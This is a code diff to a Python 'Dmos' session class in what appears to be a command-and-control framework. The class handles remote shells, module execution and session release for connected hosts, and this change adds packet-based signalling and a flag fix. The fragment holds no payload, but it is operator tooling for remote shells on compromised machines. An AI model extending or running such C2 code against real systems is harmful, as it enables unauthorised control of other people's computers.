@@ -2,9 +2,10 @@ import sys, os, threading, time, subprocess, json, readline
 from hashlib import md5
 from lib.helper import *
 from lib.debug import Debug
-#from Protocol.Packet import Packet
-
-class Dmos:
+from lib.PacketHandler import PacketHandler
+from lib.Protocol.PacketType import PacketType
+ 
+class Dmos(PacketHandler):
     def __init__(self, basic, sysinfo, global_addr, conn, c2):
         # basic
         self.GLOBAL         = global_addr
@@ -35,7 +36,7 @@ class Dmos:
             if cmd in modules_multi.keys():
                 modules_multi[cmd]._exec(self, args)
             elif command == "free":
-                self.free_dmos()
+                self.free_dmos(command)
                 terminate(self.c2.multi_handler.dmoss, self, signal="gracefully")
                 break
             elif command == "shell":
@@ -49,8 +50,9 @@ class Dmos:
             elif command == "b":
                 self.c2.multi_handler.cmdline()
 
-    def free_dmos(self):
-        pass
+    def free_dmos(self, command):
+        message = json.dumps({'ID': command}).encode()
+        self.sendPacket(PacketType.Command, len(message), message)
         
     def transfer(self, conn):
         """
@@ -64,7 +66,7 @@ class Dmos:
                 sys.stdout.write(buffer.decode())
                 sys.stdout.flush()
             except:
-                interactive = False
+                self.interactive = False
     def interactive_shell(self):
         self.conn.send("shell".encode())
 
